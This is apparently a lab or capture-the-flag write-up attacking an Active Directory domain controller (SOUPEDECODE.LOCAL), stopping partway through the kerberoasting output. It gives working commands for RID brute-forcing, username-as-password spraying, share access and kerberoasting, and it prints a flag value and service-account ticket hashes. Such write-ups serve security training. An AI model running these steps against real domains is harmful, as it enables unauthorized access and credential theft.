# DC01

## Recon

```bash
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15 # Me
10.0.2.70 # Target
```

::: details nmap_scan.log
```log
Open 10.0.2.70:53
Open 10.0.2.70:88
Open 10.0.2.70:445
Open 10.0.2.70:464
Open 10.0.2.70:593
Open 10.0.2.70:3268
Open 10.0.2.70:135
Open 10.0.2.70:139
Open 10.0.2.70:389
Open 10.0.2.70:5985
Open 10.0.2.70:9389
Open 10.0.2.70:49664
Open 10.0.2.70:49668
Open 10.0.2.70:49677
Open 10.0.2.70:49703
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.70

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-04 04:28:10Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49703/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-04T04:28:58
|_  start_date: N/A
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a4:1d:0d (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
|   DC01<20>             Flags: <unique><active>
| Statistics:
|   08:00:27:a4:1d:0d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52492/tcp): CLEAN (Timeout)
|   Check 2 (port 54793/tcp): CLEAN (Timeout)
|   Check 3 (port 47923/udp): CLEAN (Timeout)
|   Check 4 (port 59131/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

::: info
Added DNS record
:::

::: details enum4linux-ng.log
```bash
└─$ enum4linux-ng soupedecode.local
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... soupedecode.local
[*] Username ......... ''
[*] Random Username .. 'mpqimpng'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==========================================
|    Listener Scan on soupedecode.local    |
 ==========================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via LDAP for soupedecode.local    |
 =========================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: SOUPEDECODE.LOCAL

 ================================================================
|    NetBIOS Names and Workgroup/Domain for soupedecode.local    |
 ================================================================
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            <00> -         B <ACTIVE>  Workstation Service
- SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
- SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser
- DC01            <20> -         B <ACTIVE>  File Server Service
- MAC Address = 08-00-27-A4-1D-0D

 ==============================================
|    SMB Dialect Check on soupedecode.local    |
 ==============================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ================================================================
|    Domain Information via SMB session for soupedecode.local    |
 ================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
Derived membership: domain member
Derived domain: SOUPEDECODE

 ==============================================
|    RPC Session Check on soupedecode.local    |
 ==============================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[+] Server allows session using username 'mpqimpng', password ''
[H] Rerunning enumeration with user 'mpqimpng' might give more results

 ====================================================
|    OS Information via RPC for soupedecode.local    |
 ====================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests, sessions are possible, but not with the provided credentials (see session check results)

Completed after 1.40 seconds
```
:::

## SMB

No readable shares
```bash
└─$ netexec smb soupedecode.local -u 'guest' -p '' --shares
SMB         10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.0.2.70       445    DC01             [*] Enumerated shares
SMB         10.0.2.70       445    DC01             Share           Permissions     Remark
SMB         10.0.2.70       445    DC01             -----           -----------     ------
SMB         10.0.2.70       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.70       445    DC01             backup
SMB         10.0.2.70       445    DC01             C$                              Default share
SMB         10.0.2.70       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.70       445    DC01             NETLOGON                        Logon server share
SMB         10.0.2.70       445    DC01             SYSVOL                          Logon server share
SMB         10.0.2.70       445    DC01             Users
```

Quite a lot of users...
```bash
└─$ netexec smb soupedecode.local -u 'guest' -p '' --rid-brute | tee rid_brute.log
SMB                      10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\guest: (Guest)
SMB                      10.0.2.70       445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      10.0.2.70       445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      10.0.2.70       445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      10.0.2.70       445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB                      10.0.2.70       445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
SMB                      10.0.2.70       445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.0.2.70       445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.0.2.70       445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB                      10.0.2.70       445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB                      10.0.2.70       445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
...
SMB                      10.0.2.70       445    DC01             2062: SOUPEDECODE\fjudy998 (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2063: SOUPEDECODE\WebServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2064: SOUPEDECODE\DatabaseServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2065: SOUPEDECODE\FileServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2066: SOUPEDECODE\MailServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2067: SOUPEDECODE\BackupServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2068: SOUPEDECODE\ApplicationServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2069: SOUPEDECODE\PrintServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2070: SOUPEDECODE\ProxyServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2071: SOUPEDECODE\MonitoringServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2072: SOUPEDECODE\CitrixServer$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2073: SOUPEDECODE\PC-1$ (SidTypeUser)
...
SMB                      10.0.2.70       445    DC01             2162: SOUPEDECODE\PC-90$ (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2163: SOUPEDECODE\firewall_svc (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2164: SOUPEDECODE\backup_svc (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2165: SOUPEDECODE\web_svc (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
SMB                      10.0.2.70       445    DC01             2168: SOUPEDECODE\admin (SidTypeUser)
```

Grab usernames
```bash
└─$ grep SidTypeUser rid_brute.log | awk '{split($6, a, "\\"); print(a[2])}' | tee users.txt
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
...
```

Since there are 1000 users we can't exactly bruteforce password with rockyou, however we can try to use usernames as password.

```bash
└─$ netexec smb soupedecode.local -u users.txt -p users.txt --continue-on-success --no-bruteforce | grep -v '\[-\]'
SMB                      10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB                      10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\qt:qt (Guest)
```

We now have access to shares
```bash
└─$ netexec smb soupedecode.local -u 'ybob317' -p 'ybob317' --shares
SMB         10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.0.2.70       445    DC01             [*] Enumerated shares
SMB         10.0.2.70       445    DC01             Share           Permissions     Remark
SMB         10.0.2.70       445    DC01             -----           -----------     ------
SMB         10.0.2.70       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.70       445    DC01             backup
SMB         10.0.2.70       445    DC01             C$                              Default share
SMB         10.0.2.70       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.70       445    DC01             NETLOGON        READ            Logon server share
SMB         10.0.2.70       445    DC01             SYSVOL          READ            Logon server share
SMB         10.0.2.70       445    DC01             Users           READ
```

::: tip Creds
`ybob317:ybob317`
:::

### User.txt

```bash
└─$ impacket-smbclient 'soupedecode.local'/'ybob317':'ybob317'@'soupedecode.local'
# use Users
# ls
drw-rw-rw-          0  Thu Jul  4 18:48:22 2024 .
drw-rw-rw-          0  Mon Jun 17 13:42:50 2024 ..
drw-rw-rw-          0  Thu Jul  4 18:49:01 2024 admin
drw-rw-rw-          0  Sat Jun 15 15:56:40 2024 Administrator
drw-rw-rw-          0  Sat Jun 15 23:49:29 2024 All Users
drw-rw-rw-          0  Sat Jun 15 22:51:08 2024 Default
drw-rw-rw-          0  Sat Jun 15 23:49:29 2024 Default User
-rw-rw-rw-        174  Sat Jun 15 23:46:32 2024 desktop.ini
drw-rw-rw-          0  Sat Jun 15 13:54:32 2024 Public
drw-rw-rw-          0  Mon Jun 17 13:24:32 2024 ybob317
# pwd
/ybob317/Desktop
# cat user.txt
6bab1f09a7403980bfeb4c2b412be47b
```

## Lateral Movement

### Kerberoasting

- [https://www.thehacker.recipes/ad/movement/kerberos/kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [https://www.netexec.wiki/ldap-protocol/kerberoasting](https://www.netexec.wiki/ldap-protocol/kerberoasting)

To fix `KRB_AP_ERR_SKEW` error you can use `ntpdate`, however if you're in Virtual machine this won't work. `faketime` can be used to fix this error.
```bash
└─$ sudo ntpdate soupedecode.local
2025-10-04 01:04:18.775001 (-0400) +39598.942155 +/- 0.001043 soupedecode.local 10.0.2.70 s1 no-leap
CLOCK: time stepped by 39598.942155

└─$ echo $(( 39598.942155 / 60 / 60 ))
10.999706154166665

└─$ faketime -f +11h netexec ldap soupedecode.local -u 'ybob317' -p 'ybob317' --kerberoasting roasted.txt
LDAP        10.0.2.70       389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.2.70       389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
LDAP        10.0.2.70       389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.0.2.70       389    DC01             [*] Total of records returned 5
LDAP        10.0.2.70       389    DC01             [*] sAMAccountName: file_svc, memberOf: [], pwdLastSet: 2024-06-17 13:32:23.726085, lastLogon: <never>
LDAP        10.0.2.70       389    DC01             $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$2dd6dc3ce609b04430dd96669682776f$00644f856a402cf95c00c0c4cd1e4dce9fa42a04de63083f2a9bb3220085fa6b99adbbb1ad3c4cfacc2ad94df810e1cdb157e69be1ecc54dbca1fe4c638377ebc950ef5fd7217c7914f46599077d1e6fa5ec8873e467eca7b962965037f8cf8736c6d5cdfad473e35d3e34da53b42454ed96711c138cd18e2b7517a6196f34c9519757083f58d04301aaeb3e5176c49b4c604143074869225d92d9e3c063ef7cfba7c93036c304a44b30a229b4ae9b1046eec13adf4971de2e62c4489d8c81b4a69d99658098c4d163ef4578dc963e6e479aeb1c714b9cdfaf26a6a904c3364c7e75ac370cce2ffaa7c80bd221852cfcbdce2834abc0f0f63bc5c798b222acba8a7b817b8f724f6c9be841d4ae8ded42f63e9e9fb9ab07e2b0dd70e144bd2b561b6e3415eb8aaa13e6ccaf4f4c7e8807b6bbaac0b7af55041e151e1adbccc287a45e95278e7097d93534be5361983fdd87adf65f42078d3f511c944a674a7b66dfb686fd235c06e015a8287fd7e86da7da342409ff29ce622704a3d4f245c65aca3a5f7f1e47c84514d0b9548b03454ed9ffb8863730346946213d0c3e996f998e41715b2a7bc7f54307657a7c2635c864804774f098124bf74fc0eb60bbf6463c29b51b980af692cca68a2895b60ad0e7f98c43f2b4a2006142353eb93b27d7e5b0e29bb480c5d18aab3d6c5698c9b9a00e12efa59421ab84f0142a16e61338dbbbd1066203e1cfc8d7150b2459da29285acdc50f7dd440130fa62ce293dd743ed168f9a2aabec879762ea13da0711ecaedcac7d8e3b60292b314eb504be61606946b796bbe346c26cc0e90128aef84cf6a47f14ab97d0e6d0cbeba1f408868a39a9b4d973d98550603dd7aa25b053cd411e147e78479a18a9de6dbc2afdce69a8cc0b8537b576eab63f6899fee7ac8e81f195a9a79b5d86027fcb093c1259400ba531838f5d74418eac4cdbd835059b2450e87c6815f57f2e0905547de36a26de6be758b2c2936f8c38f0012924a5249273fb6b421c3e2907d9a9a5ccf57e0f94117faba32d6126f7874b38235307fce5b519b8cdf3c7787d90318773defe2846d0d2530cb3c36b53d485552c07613c9277dcaa51b2089b4ce22ee63bcef6d6da6146676be9962cd2e3115bcbe8f3cc3afa34d5320babc6c023f6c35fd1a2ac29a1a1a81c0202ddf143cb0c30e193363b738af5d1c6a3276bfc967f7e047e268ee7392e727f97ac02ad57c923fdea4e1b0c08c2e458787f8a4f13e9339c33b3e5ca015d61f60c23f585aada28f49201e7776684150f904198d6982ba16b95004be76066b4be227cb0be36ccd67b40dfc31db381fe3f2b2d2ecce9aa98fb4e8a6ad8ef23e5c4f3c38c6d73b89b2e6bcd3939fe9568c909c7efc95e27838aec162d5b594c39fd71f416d810800a2cc2eb9ce694e5dfc9276b087bc1d266b9624d4f319bc4781ac927232e028db2a32e1e751b3f49719f48e04d97f4d8b39a9faf1
LDAP        10.0.2.70       389    DC01             [*] sAMAccountName: firewall_svc, memberOf: [], pwdLastSet: 2024-06-17 13:28:32.710125, lastLogon: <never>
LDAP        10.0.2.70       389    DC01             $krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\firewall_svc*$80cc69e5689e7455cac789164e7cff4e$5b42c6ec98a0993b4a4babfce2f247b93a022e823871f6de58586a012e2dfe0d8ca5941c5b157478d02083c58c2cfe1201e6e6fe8dae8ffd5d83968815f742ea661422448b3ce0417624364643cdab9e831ac5c26916e28a73d9928aed0f544fe4d54f768dface6ea7a76ee6010b3c629dd65142b65ad19de7aa60cb20928e17996c8057fb949963238e1cf017fecfc8138a5a081fc0ce48295f48bf97f357e65c4d3dbdf9909d7f7ddcdaf3028f70aa8d873f92cb1b5757dc26c4fb46af3d93aa5fc0a29b8b654685897089c0dc947d0be7f5509ef1c4561697a76f34ea23db582bb395fe31e375858a9490d511f002a9e688c176f98f46b74b7ec6b6ed8109e33e9e354fb1267470c5c36b22859bcd5d203eecfc5efa2d4dfd883e40df7ebb89174e29acfd7ddc6c9df59426c611129c5f63fda0be6c2701b903d120e17312cd0c92a3367ffd1f37b34d5381214457162e4c2b8ce590cec7104dbcf406508d7ef924a892a956b4f9602bf626d8232f333310c219a1968cf2e6c99d9eab786a8c7de265a777c326e6ec055786bbd5df9f3dc0b169c00a73fff25d8582be664f828bb790ed4b675638cf18b5af78358f0434ecc5de25d2771249eb568248f1b37d235eb14a5001c6d1bf53a914ae31b8f12967012b079bc5f8010ac596907237f60736890de727f879f823416dc545219cb0258e3e199bd45f0f3c5103d8fa7a5cb7f6d57d59bb5aebbf405f17925a871e2d47b9659e9247deca7818cc5426513ad6cc19e905ef432f9fac976ce824c4c72ba14007c280d2c59f7570d6065e872a4f163d3251ed7860fae506438d55d46160e2db6fbe983392d029f1efe702837e0cdd3ab6ac4ebdc17d3edb7ae12a8be5971a7c0dc775de87d0aa201b4b6c761b9be17523cc918c05bddc8a4bb47b362472371154aca4a2d645c9d54725b32ef89d53f576db468635023aaab7a8170f249d6f8bc76ae9def6715dc10cfb63195b5f8dcf4062bdab2e9f3ffb535ec3a00de36370d86fe18695b70000d3961311011feb0ef418af16f15f770fcd2e6a62768be2b50fa15cca900778e0a378eedd2ec433656149ca88a439a3e2ef0a90bbc2e69513c97b2373f17fb18a3c3171bb108b6f647cac5f4726375c54211f024351d1dc4b38ae5741fa0389fcc6f302672348032e738a519a15e9e051e6c017f0ea2a5d2f1d074cd0ae0021c79813abd276fc39e8d987ac1376923956c91b7b2932b3272338e3dde31c508a1a3ba4da187fab121fb5f2a0ca9d0bf6bfb0b6f73b511e39ddd4dd127d4bbca0881151e962f9666150afffedacbb1b72e6fad02ec1272673d8682151004146a5431e6d817510abc0c63302e56a2f37317cb912d2a198f8555c2097a47bc7d987013f1f7fef5a1f7f6fd6f90e98a88dca33c9547e3afae3d947ab809419415d2ea41e1df47bd3f2fddb6aa581a517060ed5db835cac2b5a7cc5b56891e8ea6019b696efd78402
LDAP        10.0.2.70       389    DC01             [*] sAMAccountName: backup_svc, memberOf: [], pwdLastSet: 2024-06-17 13:28:49.476511, lastLogon: <never>
LDAP        10.0.2.70       389    DC01             $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\backup_svc*$c43916c44507da2cc839d579afdb0ffd$8b527adc6a200120eaab58b2f5f2153373d1b63f08cd104fad358eef9951caef43f0ee1a8115f0f6054c7f1a25f2334bbed45e81ba0317df43d51b25e42953184f7957d44f146c54a4557bfba882dcf43d448b617d7b052c454772afad1600d90dfc9c0e8ce093fa46055bc213ab94e9e82a401d50de3c8fb4ada8abbdb23a64857fc3dd655d9bec58b08ffde687e9d530043aa5cbb2251f52450ff8edb2bf0434af33e93c13ef059a7dd16c3450c6e2a95e071ff7b6cccbafe5d59480b562fa1b0e6152e109ef74997218ba2efe6d21a911d8af7fa936a992b3b444efd2a5b04bd0cb9b5602860592a7c8e390d4760e5881f677164489198e524b7a4f6243787b9c8cbc838900ebb60db1c3a1dcf72f7c16e38b3e07b171d5f0077cd95131be765aa212740136a79da57b62755549ebeb328daccd62dbb87467fb3010110ca8b8453237ff65ba434183534a734ede8d3635ec005680593c0c073ea18c38b3eba04a72b3b4ecc5cb3cca20dcd3a76757ac9d227e7744540ddf6954394bb9e50096d3489f91c62aacac764da3e471a5d8bd18270ca34dc054699d0aafd012f880e821c97e17ea0fb9bb4394e5c2ed74f13b1f8d113709f1a848dc72a7e73e5d1fe05ed6d54cf637728333601b52ed2f2f2673bd25309ae51b449de6e81f2d81b32be7b0afb85c3b30e6790445396abe22c7d04fc01d3b9e6507411fd8e1d12183e7dab9a34346f6a78adf67ed9c0b4eecb8edf41bc002c9cf290d8a4d52219b715b9e2032de1c886ae850919d3f09e4d1753a7fda9095561e11f5f110e09081b7b51df7306183a890df6ca335d4f29ee07f3dcb241dd5ece690e362584bf280197f61dfe3f2b9c3f3a580071ff01c04eade7265a91dd4389504b916ffc8bb45e54484074944f717f71ac629d06830700f0b98241b044e344e10b4818b4689f25f65e28810a6080cec73854275b91732e094708820e970ed05b3d0c0e59412f4cb05e743dd24429e896df991446d08e2e2239327f6bdaae4f2eb40eb691e13a64f458be761caf1e128fe646d3fc78017d1b2d1bcd72f9910e7fd3044398a914a15099d028edc562010ab50c935eefcb44cf05981599ef9176dbb0d9c09e136b603087ec2d16ce44e9dec2f84bf84d534429e29f940a1f21fb125d15aae6620eb51d2a0549fdc564323d7969b25137bb980399553fe02ae8156308d3f219678d86f6b1de72c6faef32ca2bb26f82f3755b243ddd9fd377fcb182407488d2670fa240c86bbf697d60e67b9799ef8d71c4efa1329cb242561cf8ca5bc182e7270ce05061e2c2f611bc811b620a77c9028f214c3c9d7b3c4d1c05011b2416d97cc3e25c6bac64d7677425b3c4848f36faff6461fd692153beca2c26b1b69d19bdb28353f20969ca64bf5a8dcaa4889323d0130b25a25dba4709c85f5c37f2d950726466de575ec78384529648f5967d4320601dca77d47af7d08b03a5711040562b7bf78
LDAP        10.0.2.70       389    DC01             [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2024-06-17 13:29:04.569417, lastLogon: <never>
LDAP        10.0.2.70       389    DC01             $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\web_svc*$43b11b708bcc7208bada80af33355028$869e510fe40495a70e905e7846ab667374d80a1997f642f38f68514d6ad610a00b05e51d0eb5a235c1c53530c35fcf524c53398628a56e88ec72317d7d165664c88cd40e8e8d3f021bc7d37d7449478b5f23b0dbb22ea6373c4640a3712831a0ca4bc3f755811b2c5bec0cf236805dbc8fa9f46e15b1ea917c76f441b7f128323671330eb14c6cfe9279bce09851cf2417466576f3cec96d9b8387adc8218b952a0f3e9ad5ad5c605aabaa9a7e814ad4943477d4a5d0832c633fbd5b6d2cce62615190aff052a04747d9e3db82e3317072920b97e40c6b6f65148d309969a6694360c3352eb87304c3431a4f8550ec64e127e5a5a729218c74ffbe457ab7c98d71a583090f85d97f4cc7c519019ee8c425703b00064d41275a0a6a8fb25ae4e3f94fecc9ccfa385a468c1095ed10d63b88861e31b628cb217fe8f2a69e6a42e654e3323325b488eec17c98a5e1de3eb6c81b19f57836a7fc08b54631b4a0048982ef57dfcd3df2cfbdd5bd6745e27fe1cd414e1707b76917360d9f338a24e41f64c5e84ccf7736c03848e24ba0d871d081764fa3b538ffb2810095900a50f1b7b38653aaf6c539a94208887909e0d75640f2bd65f733d0ef620f302604eb142169ac0dd8eb06be2e77b24055f73288cb1533e531aa3aaa09a8d3ae183ad826202f2345f6c6b7afd482c8c649ef2066a248440e49f3e13b8f91c20bcf6cb38ee3354f9d0a128339357952d33e672b960fbaaf124e1a98e45dc1b865dfb09c2a9d819e7d3785d2bf5d965d563ffe1b39fd024c6500932469f6d541d2922f475e99771a697b5f9b75f300273a8906eab7446ea3d1472463997708ba364f75bc892f7ad87ffd759b16b10321a654c831e71560d429ab2f16a5c8aa3f40b5b695fcc8c69df6a17c5811e266b6bffe5c64b23bdb71924a57f7bb1f9c2124ccb4dd4d0b069d356544bbee463cc119d62d6bef98db3053601190f9ec3b932ceb169b03bacc0a1605b730d6eef97c0a66a67efc92dbec49ef17bc60913635c2d4e34d8188ea12d3e1c2e41e0672984e343f83ff90741963d5d99938e0e23a7e3e4fd16e8ce9113cc6197db5ed0df326b60d74a1270b51a8617414beca5939c24415f38e2665cf328b23a58c32a6d2ff983b1a12d2d4fb0d8a9e77c9add2852b71421a9c8f9c3399fcd57e4d929c7c313990d285371b40759677d8a6cbf2e9a139f8aa0981e2756862a222b91d9263376ba0c9fb073a92be1630599e3a13a0d36ed4b4c577e3255cd8c275e8c262759a16dc9f88dc28072922fc3f0b5c2af38b63ff1b1a24543e70245688f69ebaead659994bfc13876aba1181b349410e768359618c5979d889951bbe70ac90e843740fd91cf8bca37d2b71036d5cf65ca19ad3638c1c2fa2de3d8a7c2d9a85df85b78eb5291aa9c5fedb190b07fbce0a8eb95286d44fc1ca7137611b179a27a129e52c5af1ccaea067fccab14e2c7336b9f9ef8eddbb59c2
LDAP        10.0.2.70       389    DC01             [*] sAMAccountName: monitoring_svc, memberOf: [], pwdLastSet: 2024-06-17 13:29:18.511871, lastLogon: <never>
LDAP        10.0.2.70       389    DC01             $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\monitoring_svc*$1d399d389cdb0800169d054c346d84e3$abd88e074332ed3111b1e7c9c613e4ba42d23ff02cb7e88d8cddd9b3ee0c3a76f6e53852e8c1e23925739f47a492cdda4d96a9740c8fcff2f75aedbe13488df0e472a202aa75d00fb7056c38fbd1e4eb3f3510242f99ed9b0813d05d66f246551c07a7a3a02989e542c12c9ad30d3a73dc384482f47813a5ad7c857dc1b6d09250559f0cff589a90acc4e4fd324e59feb1d8d0f6f9f5d45a1f38b07ece375cc6e79f9e1ba351ecfb0e3d3a09b93af9fe7e621d6fb2ade00d2f8be41c28a78259c489f66a8ab6f3275ad69e631f64091607921bf3d94201810843290b2d4de986c7a0aac1a127fa3ef8cbb262e1e8800c439ac8b630c74b37fbad9ddb827ae8547e1f778561bb455e4054407abb7f6b395975529e33edf8f80dc388fc2df7af3407638340780bd5623a9590510a9a4e2fd46b255a8df3fdb7a5ef3cec2fdbaaaf76c773b099049643b99ae0cd3ccc426041501a168443e5b433fa09507bf6dbf9a499e775fd08087eea9260ea05004076fafac82ae4d63a2314babcf746a10c55d037d2d66676e904d9e7c5c92bd8bbc3849c00b82244e0e9a8e2ff81533a1eaa89b0b4e26024ad7920a7e9c17158bd7ed9959ce352d1e3030d3bb10fef3eb19ee40fe88423ea2a97d2d1c43bd94cdbe447b9ecfa9c6fd650a7b2d6dab6bfd8fcf26e7d5687cafe2d579855aab0bcebee92b9b58efce0933544d978863f236f7c3962801d500fbc6b7513685ab00304e65e16b578e9a99baa21e060b169e90a6f16a8814ff4df5b69837bed7c8631bde1a147077c9ad0fb55f6bddbdf5a455d88f1ff570fa40c5f797da61b79e